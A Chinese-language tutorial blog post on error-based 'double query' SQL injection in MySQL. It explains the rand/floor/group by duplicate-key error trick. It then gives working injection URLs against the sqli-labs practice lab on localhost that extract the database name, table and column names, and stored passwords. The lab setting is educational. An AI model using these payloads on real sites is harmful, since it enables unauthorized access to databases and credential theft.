---
title: SQL注入-Error Based Injections (Double Injection Based)
date: 2017-08-24 18:06:54
categories: SQL注入
tags: 
copyright: true
---
双查询注入(Double Qurry)顾名思义形式上是两个嵌套的查询，即select ...(select ...)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双查询注入主要涉及到了几个sql函数：
```sql
rand()随机函数，返回0~1之间的某个值
floor(a)取整函数，返回小于等于a，且值最接近a的一个整数
count()聚合函数也称作计数函数，返回查询对象的总数
group by cluase分组语句，按照cluase对查询结果分组
```
双注入的原理总的来说就是，当一个聚合函数(如count())后面出现group by分组语句时，会将查询的一部分结果以报错的形式返回.
<!--more-->
先在mysql中做一下实验：
```c
mysql> select rand();
+--------------------+
| rand()             |
+--------------------+
| 0.8584465243466631 |
+--------------------+
1 row in set (0.00 sec)

mysql> select rand();
+-------------------+
| rand()            |
+-------------------+
| 0.504866948821458 |
+-------------------+
1 row in set (0.00 sec)

mysql> select floor(rand());
+---------------+
| floor(rand()) |
+---------------+
|             0 |
+---------------+
1 row in set (0.00 sec)

mysql> select floor(rand()*2);
+-----------------+
| floor(rand()*2) |
+-----------------+
|               0 |
+-----------------+
1 row in set (0.00 sec)

mysql> select floor(rand()*2);
+-----------------+
| floor(rand()*2) |
+-----------------+
|               1 |
+-----------------+
1 row in set (0.01 sec)
```
以sqli-labs(Less-5)为例：
输入`http://localhost/sqli-labs-master/Less-5/?id=1`页面显示`you are in`
加入单引号`http://localhost/sqli-labs-master/Less-5/?id=1'`
根据语法报错`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`我们能推断出后台的查询语句：
`select uesrname and password from users where id='input'`.
通过order by查询出字段数后，再用联合查询并不你能回显出任何信息，此时就需要运用Double Query．
```c
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)); 
```
```c
mysql> select concat((select database()),floor(rand()*2));
+---------------------------------------------+
| concat((select database()),floor(rand()*2)) |
+---------------------------------------------+
| security0                                   |
+---------------------------------------------+
```
如果在语句后面上from,如：
```c
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from users;
```
得到的结果：
```c
mysql> select concat((select database()),floor(rand()*2)) from users;
+---------------------------------------------+
| concat((select database()),floor(rand()*2)) |
+---------------------------------------------+
| security1                                   |
| security0                                   |
| security1                                   |
| security1                                   |
| security1                                   |
| security0                                   |
| security1                                   |
| security1                                   |
| security1                                   |
| security0                                   |
| security1                                   |
| security1                                   |
| security1                                   |
+---------------------------------------------+
13 rows in set (0.00 sec)
```
users表中原有１３条用户信息，所以这里显示１３条记录．
再将concat和group by联合使用，给concat((select database()),floor(rand()*2))取别名为a
```c
mysql> select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;
+----------+-----------+
| count(*) | a         |
+----------+-----------+
|        4 | security0 |
|        9 | security1 |
+----------+-----------+
2 rows in set (0.00 sec)

mysql> select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;
+----------+-----------+
| count(*) | a         |
+----------+-----------+
|        5 | security0 |
|        8 | security1 |
+----------+-----------+
2 rows in set (0.00 sec)

mysql> select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;
ERROR 1062 (23000): Duplicate entry 'security0' for key '<group_key>'
```
再多次执行之后，语句执行报出了错误信息，其中serurity便表示希望得到的数据库名． 使用函数rand()和floor()
的目的在于能使用group by进行分组，如果执行语句
```c
mysql> select 1,count(*),(select database())as a from information_schema.schemata group by a;
+---+----------+----------+
| 1 | count(*) | a        |
+---+----------+----------+
| 1 |        6 | security |
+---+----------+----------+
```
不会产生报错．
```php
//得到数据库名'security'
http://localhost/sqli-labs-master/Less-6/?id=1" 
union select 1,count(*),concat((select database()),floor(rand()*2))as a 
from information_schema.schemata  group by a%23
```
```
//得到表名'users'
http://localhost/sqli-labs-master/Less-6/?id=1" 
union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand()*2))as a 
from information_schema.schemata  group by a%23
```
```
//得到列名'password'
 http://localhost/sqli-labs-master/Less-6/?id=1" 
 union select 1,count(*),concat((select column_name from information_schema.columns where table_name='users' limit 3,1 ),floor(rand()*2))as a 
 from information_schema.schemata group by a%23
```
```
//脱库
http://localhost/sqli-labs-master/Less-6/?id=1" 
union select 1,count(*),concat((select password from users  limit 0,1),floor(rand()*2))as a 
from information_schema.schemata  group by a%23
```